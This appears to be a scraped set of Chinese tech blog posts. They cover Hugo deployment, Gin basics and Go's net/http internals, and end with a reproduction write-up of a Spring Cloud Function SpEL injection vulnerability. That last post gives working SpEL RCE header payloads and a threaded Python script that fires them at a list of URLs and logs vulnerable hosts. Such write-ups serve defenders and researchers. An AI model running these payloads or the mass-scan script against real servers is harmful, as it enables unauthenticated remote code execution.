运行环境，我们选择了 ubuntu-latest。我们的 build 任务包含了 Checkout、Setup Hugo、Build Web 和 Deploy Web 四个主要步骤，其中 run 是执行的命令，uses 是 GitHub Action 中的一个插件，我们使用了 peaceiris/actions-hugo@v2 和 peaceiris/actions-gh-pages@v3 这两个插件。其中 Checkout 步骤中 with 中配置 submodules 值为 true 可以同步博客源仓库的子模块，即我们的主题模块。\n经过上述配置，我们已经实现了 Hugo 博客本地搭建及版本管理、GitHub Pages 部署网站发布，Hugp 主题管理及更新等功能，实现了完整的系统。现在每当我们本地通过熟悉的 Markdown 语法完成博客内容编辑后，只需要推送代码，等待几分钟，即可通过我们的自定义域名访问更新后的网站。\n1 2 3 4 git remote add origin git@github.com:reus09/blog.git git add -A git commit -m \u0026#34;test\u0026#34; git push -u origin master -f 即可实现自动化上传源码 问题 在上述配置好之后，push之后发现一个问题，在checkout有个问题\n即他在.gitmodules没有这个 submodule path\n于是我们在myblog目录下加入.gitmodules\n1 2 3 4 [submodule \u0026#34;themes/hugo-PaperMod\u0026#34;] path = themes/hugo-PaperMod url = https://github.com/adityatelange/hugo-PaperMod branch = master 发现就可以解决了 ","permalink":"http://www.reus09.top/posts/tech/hugo%E9%83%A8%E7%BD%B2github/","summary":"最近阿里云服务器到期，服务太贵了，所以就想着继续使用github作为博客搭建的方法。以前使用hexo作为静态博客工具。最近了解了一下hugo","title":"Hugo部署github"},{"content":"对开源的开发框架gin进行了简单的学习，对常用的进行了简单的整理。\n初始化 这里直接给出一个通用的模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 func main(){ // 使用默认中间件创建一个gin路由器 // logger and recovery (crash-free) 中间件 router := gin.Default() // 加载templates目录下的所有文件为html router.LoadHTMLGlob(\u0026#34;/templates/**\u0026#34;) router.GET(\u0026#34;/someGet\u0026#34;, getting) router.POST(\u0026#34;/somePost\u0026#34;, posting) router.PUT(\u0026#34;/somePut\u0026#34;, putting) router.DELETE(\u0026#34;/someDelete\u0026#34;, deleting) router.PATCH(\u0026#34;/somePatch\u0026#34;, patching) router.HEAD(\u0026#34;/someHead\u0026#34;, head) router.OPTIONS(\u0026#34;/someOptions\u0026#34;, options) // Simple group: v1 v1 := router.Group(\u0026#34;/v1\u0026#34;) {\t// /v1/login v1.POST(\u0026#34;/login\u0026#34;, loginEndpoint) v1.POST(\u0026#34;/submit\u0026#34;, submitEndpoint) v1.POST(\u0026#34;/read\u0026#34;, readEndpoint) } // 默认启动的是 8080端口，也可以自己定义启动端口 router.Run() // router.Run(\u0026#34;:3000\u0026#34;) for a hard coded port } gin.Default()初始了中间件，默认为logger和recovery,也可以通过gin.New()实现无中间件启动服务 同时gin也支持七种HTTP请求方式，方便后端业务增删改查的调用。 获取参数 Rest风格获取参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 此规则能够匹配/user/john这种格式，但不能匹配/user/ 或 /user这种格式 router.GET(\u0026#34;/user/:name\u0026#34;, func(c *gin.Context) { name := c.Param(\u0026#34;name\u0026#34;) c.String(http.StatusOK, \u0026#34;Hello %s\u0026#34;, name) }) // 但是，这个规则既能匹配/user/john/格式也能匹配/user/john/send这种格式 // 如果没有其他路由器匹配/user/john，它将重定向到/user/john/ router.GET(\u0026#34;/user/:name/*action\u0026#34;, func(c *gin.Context) { name := c.Param(\u0026#34;name\u0026#34;) action := c.Param(\u0026#34;action\u0026#34;) message := name + \u0026#34; is \u0026#34; + action c.String(http.StatusOK, message) }) 可以通过:和*来实现restful风格的传参并获取。 常规获取参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 匹配的url格式: /welcome?firstname=Jane\u0026amp;lastname=Doe router.GET(\u0026#34;/welcome\u0026#34;, func(c *gin.Context) { firstname := c.DefaultQuery(\u0026#34;firstname\u0026#34;, \u0026#34;Guest\u0026#34;) lastname := c.Query(\u0026#34;lastname\u0026#34;) // 是 c.Request.URL.Query().Get(\u0026#34;lastname\u0026#34;) 的简写 c.String(http.StatusOK, \u0026#34;Hello %s %s\u0026#34;, firstname, lastname) }) // 传入的post 请求 router.POST(\u0026#34;/form_post\u0026#34;, func(c *gin.Context) { message := c.PostForm(\u0026#34;message\u0026#34;) nick := c.DefaultPostForm(\u0026#34;nick\u0026#34;, \u0026#34;anonymous\u0026#34;) // 此方法可以设置默认值 c.JSON(200, gin.H{ \u0026#34;status\u0026#34;: \u0026#34;posted\u0026#34;, \u0026#34;message\u0026#34;: message, \u0026#34;nick\u0026#34;: nick, }) }) 获取get请求的参数需要用到方法Query，DefaultQuery方法为某个参数设置默认值，在没有传入的情况下存在默认值。 获取POST的参数用的方法PostForm获取提交的数据，DefaultPostForm同样为设置默认值。 上传文件 gin对file封装的较为完善，文件上传用起来也比较方便，对于单个文件，直接通过FormFile获取传入对应的文件名即可，对于上传的多个文件，将其转化为文件数组即可。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 给表单限制上传大小 (默认 32 MiB) // router.MaxMultipartMemory = 8 \u0026lt;\u0026lt; 20 // 8 MiB router.POST(\u0026#34;/upload\u0026#34;, func(c *gin.Context) { // 单文件 file, _ := c.FormFile(\u0026#34;file\u0026#34;) log.Println(file.Filename) // 多文件 form, _ := c.MultipartForm() files := form.File[\u0026#34;upload[]\u0026#34;] for _, file := range files { log.Println(file.Filename) } // 上传文件到指定的路径 // c.SaveUploadedFile(file, dst) c.String(http.StatusOK, fmt.Sprintf(\u0026#34;\u0026#39;%s\u0026#39; uploaded!\u0026#34;, file.Filename)) }) 目录结构设计 从上到下目录结构为:\n文件 概要 config 配置文件对应的结构体定义 controller 业务层 dao 操作数据库,给业务controller提供数据 forms 字段验证的struct global 定义全局变量 initialize 服务初始化 logs 日志存储 middlewares 中间件 models 数据库字段定义 Response 统一封装response static 资源文件夹 router 路由 setting-dev.yaml 配置文件 main.go 服务启动文件 ","permalink":"http://www.reus09.top/posts/tech/gin/","summary":"对开源的开发框架gin进行了简单的学习，对常用的进行了简单的整理。 初始化 这里直接给出一个通用的模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21","title":"Gin"},{"content":"很长时间没有水博客了，前些天学习了一下go的语法。go凭借其轻量级和并发性的原因，性能越来越优异，这里简单分析一下如何通过go原生的http开启一个web服务，并对其过程进行一定的剖析。\n[TOC]\ngo原生的web服务搭建 Go 语言里面提供了一个完善的 net/http 包，通过 http 包可以很方便的就搭建起来一个可以运行的 Web 服务。同时使用这个包能很简单地对 Web 的路由，静态文件，模版，cookie 等数据进行设置和操作。\n比如说，给定代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;log\u0026#34; ) func sayhelloName(w http.ResponseWriter, r *http.Request) { r.ParseForm() // 解析参数，默认是不会解析的 fmt.Println(r.Form) // 这些信息是输出到服务器端的打印信息 fmt.Println(\u0026#34;path\u0026#34;, r.URL.Path) fmt.Println(\u0026#34;scheme\u0026#34;, r.URL.Scheme) fmt.Println(r.Form[\u0026#34;url_long\u0026#34;]) for k, v := range r.Form { fmt.Println(\u0026#34;key:\u0026#34;, k) fmt.Println(\u0026#34;val:\u0026#34;, strings.Join(v, \u0026#34;\u0026#34;)) } fmt.Fprintf(w, \u0026#34;Hello astaxie!\u0026#34;) // 这个写入到 w 的是输出到客户端的 } func main() { http.HandleFunc(\u0026#34;/\u0026#34;, sayhelloName) // 设置访问的路由 err := http.ListenAndServe(\u0026#34;:9090\u0026#34;, nil) // 设置监听的端口 if err != nil { log.Fatal(\u0026#34;ListenAndServe: \u0026#34;, err) } } 通过此，我们可以通过http包下面的两个函数HandleFunc和ListenAndServer函数可以开启一个web服务器。并且在HandleFunc中我们可以指定我们该路由下面的处理方法。 http包执行流程 如图，为Go实现Web服务的流程图。\n1、在服务器端创建一个Listen Socket ，监听指定的端口，等到客户端访问 2、Listen Socket接收到客户端accept,就会生成一个Client Socket,之后所有的会话都由Client Socket 于 客户端通信。 3、建立连接后，处理客户端的请求时。首先从 Client Socket 读取 HTTP 请求的协议头，如果是 POST 方法，还可能要读取客户端提交的数据，然后交给相应的 handler 处理请求，handler 处理完毕准备好客户端需要的数据，通过 Client Socket 写给客户端。(这里的handler即为我们自定义的函数) 如何监听端口 Go 是通过一个函数 ListenAndServe 来处理这些事情的，这个底层其实这样处理的：初始化一个 server 对象，然后调用了 net.Listen(\u0026ldquo;tcp\u0026rdquo;, addr)，也就是底层用 TCP 协议搭建了一个服务，然后监控我们设置的端口。\n我们通过查看ListenAndServe可以看到,确实如此。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func (srv *Server) ListenAndServe() error { if srv.shuttingDown() { return ErrServerClosed } addr := srv.Addr if addr == \u0026#34;\u0026#34; { addr = \u0026#34;:http\u0026#34; } ln, err := net.Listen(\u0026#34;tcp\u0026#34;, addr) if err != nil { return err } return srv.Serve(ln) } 处理请求 然后，建立监控之后，go通过srv.Server(ln)方法来实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 func (srv *Server) Serve(l net.Listener) error { if fn := testHookServerServe; fn != nil { fn(srv, l) // call hook with unwrapped listener } origListener := l l = \u0026amp;onceCloseListener{Listener: l} defer l.Close() if err := srv.setupHTTP2_Serve(); err != nil { return err } if !srv.trackListener(\u0026amp;l, true) { return ErrServerClosed } defer srv.trackListener(\u0026amp;l, false) baseCtx := context.Background() if srv.BaseContext != nil { baseCtx = srv.BaseContext(origListener) if baseCtx == nil { panic(\u0026#34;BaseContext returned a nil context\u0026#34;) } } var tempDelay time.Duration // how long to sleep on accept failure ctx := context.WithValue(baseCtx, ServerContextKey, srv) for { rw, err := l.Accept() if err != nil { select { case \u0026lt;-srv.getDoneChan(): return ErrServerClosed default: } if ne, ok := err.(net.Error); ok \u0026amp;\u0026amp; ne.Temporary() { if tempDelay == 0 { tempDelay = 5 * time.Millisecond } else { tempDelay *= 2 } if max := 1 * time.Second; tempDelay \u0026gt; max { tempDelay = max } srv.logf(\u0026#34;http: Accept error: %v; retrying in %v\u0026#34;, err, tempDelay) time.Sleep(tempDelay) continue } return err } connCtx := ctx if cc := srv.ConnContext; cc != nil { connCtx = cc(connCtx, rw) if connCtx == nil { panic(\u0026#34;ConnContext returned nil\u0026#34;) } } tempDelay = 0 c := srv.newConn(rw) c.setState(c.rwc, StateNew, runHooks) // before Serve can return go c.serve(connCtx) } } 这个函数就是用来处理客户端的请求信息。里面有一个for循环，通过Listener接收数据，然后创建一个Conn,最后通过go c.server()来保证高并发，使用户的每一次请求都在一个新的goroutine去服务，相互不影响。\n分配函数处理请求 在c.server()中，对请求做一下处理，找到对应的handler\n1 2 w, err := c.readRequest(ctx) serverHandler{c.server}.ServeHTTP(w, w.req) conn 首先会解析 request:c.readRequest(), 然后获取相应的 handler:handler := c.server.Handler，也就是我们刚才在调用函数 ListenAndServe 时候的第二个参数。\n进一步查看ServerHTTP如何找到对应的Handler\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func (sh serverHandler) ServeHTTP(rw ResponseWriter, req *Request) { handler := sh.srv.Handler if handler == nil { handler = DefaultServeMux } if req.RequestURI == \u0026#34;*\u0026#34; \u0026amp;\u0026amp; req.Method == \u0026#34;OPTIONS\u0026#34; { handler = globalOptionsHandler{} } if req.URL != nil \u0026amp;\u0026amp; strings.Contains(req.URL.RawQuery, \u0026#34;;\u0026#34;) { var allowQuerySemicolonsInUse int32 req = req.WithContext(context.WithValue(req.Context(), silenceSemWarnContextKey, func() { atomic.StoreInt32(\u0026amp;allowQuerySemicolonsInUse, 1) })) defer func() { if atomic.LoadInt32(\u0026amp;allowQuerySemicolonsInUse) == 0 { sh.srv.logf(\u0026#34;http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192\u0026#34;) } }() } handler.ServeHTTP(rw, req) } 我们前面例子传递的是 nil，也就是为空，那么默认获取 handler = DefaultServeMux, 这个变量就是一个路由器，它用来匹配 url 跳转到其相应的 handle 函数，我们通过调用http.HandleFunc(\u0026quot;/\u0026quot;, sayhelloName) 来生成一个handler。这个作用就是注册了请求 / 的路由规则，当请求 uri 为 \u0026ldquo;/\u0026quot;，路由就会转到函数 sayhelloName，DefaultServeMux 会调用 ServeHTTP 方法，这个方法内部其实就是调用 sayhelloName 本身，最后通过写入 response 的信息反馈到客户端。\nServeMux的自定义 上面讲述传入的handler为nil的时候，就会调用http默认的路由器，通过路由器将请求传递到后端处理函数。\n结构如下：\n1 2 3 4 5 type ServeMux struct { mu sync.RWMutex // 锁，由于请求涉及到并发处理，因此这里需要一个锁机制 m map[string]muxEntry // 路由规则，一个 string 对应一个 mux 实体，这里的 string 就是注册的路由表达式 hosts bool // 是否在任意的规则中带有 host 信息 } 下面看一下啊muxEntry:\n1 2 3 4 5 type muxEntry struct { explicit bool // 是否精确匹配 h Handler // 这个路由表达式对应哪个 handler pattern string // 匹配字符串 } 接着看一下 Handler :\n1 2 3 type Handler interface { ServeHTTP(ResponseWriter, *Request) // 路由实现器 } 下图是通过debug获取的封装到默认路由器的信息。\n详细介绍一下如何将我们传入的函数封装为我们路由对应的handler。\n首先，在http包里面定义一个类型HandleFunc，我们定义的函数sayhelloName就是其调用之后的结果，这个类型默认就实现了 ServeHTTP 这个接口，即我们调用了 HandlerFunc (f), 强制类型转换 f 成为 HandlerFunc 类型，这样 f 就拥有了 ServeHTTP 方法。\n1 2 3 4 5 6 7 type HandlerFunc func(ResponseWriter, *Request) // ServeHTTP calls f(w, r). func (f HandlerFunc) ServeHTTP(w ResponseWriter, r *Request) { f(w, r) } 1 2 3 4 5 6 7 8 // HandleFunc registers the handler function for the given pattern. func (mux *ServeMux) HandleFunc(pattern string, handler func(ResponseWriter, *Request)) { if handler == nil { panic(\u0026#34;http: nil handler\u0026#34;) } // 将f()类型强转化为`HandleFunc` mux.Handle(pattern, HandlerFunc(handler)) } 这样路由器就存储了对应的路由规则，默认路由器的ServeHTTP如下：\n1 2 3 4 5 6 7 8 9 func (mux *ServeMux) ServeHTTP(w ResponseWriter, r *Request) { if r.RequestURI == \u0026#34;*\u0026#34; { w.Header().Set(\u0026#34;Connection\u0026#34;, \u0026#34;close\u0026#34;) w.WriteHeader(StatusBadRequest) return } h, _ := mux.Handler(r) h.ServeHTTP(w, r) } 如果传入URI为*,那么就关闭链接，否则调用mux.Handler(r)，返回我们设置路由的Handler,然后调用他的ServerHTTP(w,r) 分析一下，如何通过mux.Handler(r)来找到我们对应的路由\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 func (mux *ServeMux) Handler(r *Request) (h Handler, pattern string) { // 判断方法是否为CONNECT if r.Method != \u0026#34;CONNECT\u0026#34; { if p := cleanPath(r.URL.Path); p != r.URL.Path { _, pattern = mux.handler(r.Host, p) return RedirectHandler(p, StatusMovedPermanently), pattern } } // 不是CONNECT的话，就调用自己的hanlder return mux.handler(r.Host, r.URL.Path) } func (mux *ServeMux) handler(host, path string) (h Handler, pattern string) { mux.mu.RLock() defer mux.mu.RUnlock() // 通过host + path 在mu中匹配自己的handler // Host-specific pattern takes precedence over generic ones if mux.hosts { h, pattern = mux.match(host + path) } if h == nil { h, pattern = mux.match(path) } if h == nil { h, pattern = NotFoundHandler(), \u0026#34;\u0026#34; } return } 发现其是根据用户请求的 URL 和路由器里面存储的 map 去匹配的，当匹配到之后返回存储的 handler，调用这个 handler 的 ServeHTTP 接口就可以执行到相应的函数了。\nA 判断是否有路由能满足这个 request（循环遍历 ServeMux 的 muxEntry） B 如果有路由满足，调用这个路由 handler 的 ServeHTTP C 如果没有路由满足，调用 NotFoundHandler 的 ServeHTTP ","permalink":"http://www.reus09.top/posts/tech/go%E5%8E%9F%E7%94%9Fnet%E5%8C%85%E5%88%86%E6%9E%90/","summary":"很长时间没有水博客了，前些天学习了一下go的语法。go凭借其轻量级和并发性的原因，性能越来越优异，这里简单分析一下如何通过go原生的http","title":"Go原生net包分析"},{"content":"漏洞介绍 Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种平台上部署基于函数的软件。 由于Spring Cloud Function存在SpEL表达式注入漏洞。远程攻击者无需认证即可构造特定的数据包，并通过特定的 HTTP 请求头注入 SpEL 表达式。最终可导致远程执行任意代码，获取服务器权限。 风险等级：高风险 漏洞风险：攻击者利用该漏洞可导致远程执行任意代码，获取服务器权限 影响版本 Spring Cloud Function =\u0026lt; 3.1.6 Spring Cloud Function =\u0026lt; 3.2.2 安全版本 Spring Cloud Function \u0026gt;= 3.1.7 Spring Cloud Function \u0026gt;= 3.2.3 SpringCloud Function介绍 SpringCloud 是一套分布式系统的解决方案，常见的还有阿里巴巴的Dubbo，Fass（Function As A Service ）的底层实现就是函数式编程，在视频转码、音视频转换、数据仓库ETL等与状态相关度低的领域运用的比较多。开发者无需关注服务器环境运维等问题上，专注于自身业务逻辑实现即可。 SpringCloud Function 就是Spring提供的分布式函数式编程组件。 漏洞环境搭建 通过idea新建一个Spring项目，pom中引入spring-boot-starter-web、spring-cloud-function-web，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;io.spring.sample\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;function-sample-pojo\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1.RELEASE\u0026lt;/version\u0026gt; \u0026lt;packaging\u0026gt;jar\u0026lt;/packaging\u0026gt; \u0026lt;name\u0026gt;function-sample-pojo\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;Spring Cloud Function Web Support\u0026lt;/description\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;spring-cloud-function.version\u0026gt;3.2.1-SNAPSHOT\u0026lt;/spring-cloud-function.version\u0026gt; \u0026lt;wrapper.version\u0026gt;1.0.27.RELEASE\u0026lt;/wrapper.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-function-webflux\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-configuration-processor\u0026lt;/artifactId\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-function-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud-function.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-deploy-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;skip\u0026gt;true\u0026lt;/skip\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot.experimental\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-thin-layout\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${wrapper.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-surefire-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;includes\u0026gt; \u0026lt;include\u0026gt;**/*Tests.java\u0026lt;/include\u0026gt; \u0026lt;include\u0026gt;**/*Test.java\u0026lt;/include\u0026gt; \u0026lt;/includes\u0026gt; \u0026lt;excludes\u0026gt; \u0026lt;exclude\u0026gt;**/Abstract*.java\u0026lt;/exclude\u0026gt; \u0026lt;/excludes\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;repositories\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-snapshots\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Snapshots\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-snapshot-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-milestones\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Milestones\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-milestone-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-releases\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Releases\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/release\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;/repositories\u0026gt; \u0026lt;pluginRepositories\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-snapshots\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Snapshots\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-snapshot-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-milestones\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Milestones\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-milestone-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-releases\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Releases\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-release-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;/pluginRepositories\u0026gt; \u0026lt;/project\u0026gt; 建立一个配置类，用于实现字符串小写\n在applications.properties中写入spring.cloud.function.definition:functionRouter\n如果设置为functionRouter则默认路由绑定的具体函数交由用户进行控制，在 Spring Cloud Function Web里面，可以通过设置http头的方式来控制，使用spring.cloud.function.definition 和spring.cloud.function.routing-expression 都可以，区别是后者允许使用Spring表达式语言（SpEL）。 开启8090端口\n漏洞复现 在HTTP请求头加入spring.cloud.function.routing-expression:\npayload:spring.cloud.function.routing-expression: new ProcessBuilder('/System/Applications/Calculator.app/Contents/MacOS/Calculator').start()\n同时也可以通过T(java.lang.Runtime).getRuntime().exec(\u0026quot;cmd\u0026quot;)来执行任意命令执行\n但是这种命令执行没有回显。 exp脚本\nexp实际上就是封装好我们我们需要发送的数据包，带上我们的恶意参数头。 实际上，这个exp也可以执行其他命令，只需要更改发送数据包的payload即可，下面的反弹shell就会用到该脚本。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import requests import sys import threading import urllib3 urllib3.disable_warnings() def scan(txt,cmd): # payload1=f\u0026#39;T(java.lang.Runtime).getRuntime().exec(\u0026#34;{cmd}\u0026#34;)\u0026#39; payload = \u0026#34;new ProcessBuilder(\u0026#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#39;).start()\u0026#34; data =\u0026#39;test\u0026#39; headers = { \u0026#39;spring.cloud.function.routing-expression\u0026#39;:payload, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;en\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; } path = \u0026#39;/functionRouter\u0026#39; f = open(txt) urllist=f.readlines() for url in urllist : url = url.strip(\u0026#39;\\n\u0026#39;) all = url + path try: req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3) code =req.status_code text = req.text rsp = \u0026#39;\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;\u0026#39; if code == 500 and rsp in text: print ( f\u0026#39;[+] { url } is vulnerable\u0026#39; ) poc_file = open(\u0026#39;vulnerable.txt\u0026#39;, \u0026#39;a+\u0026#39;) poc_file.write(url + \u0026#39;\\n\u0026#39;) poc_file.close() else: print ( f\u0026#39;[-] { url } not vulnerable\u0026#39; ) except requests.exceptions.RequestException: print ( f\u0026#39;[-] { url } detection timed out\u0026#39; ) continue except: print ( f\u0026#39;[-] { url } error\u0026#39; ) continue if __name__ == \u0026#39;__main__\u0026#39; : try: cmd1 =sys.argv[1] t = threading . Thread ( target = scan ( cmd1 , \u0026#39;whoami\u0026#39; ) ) t.start() except: print ( \u0026#39;Usage:\u0026#39; ) print(\u0026#39;python poc.py url.txt\u0026#39;) 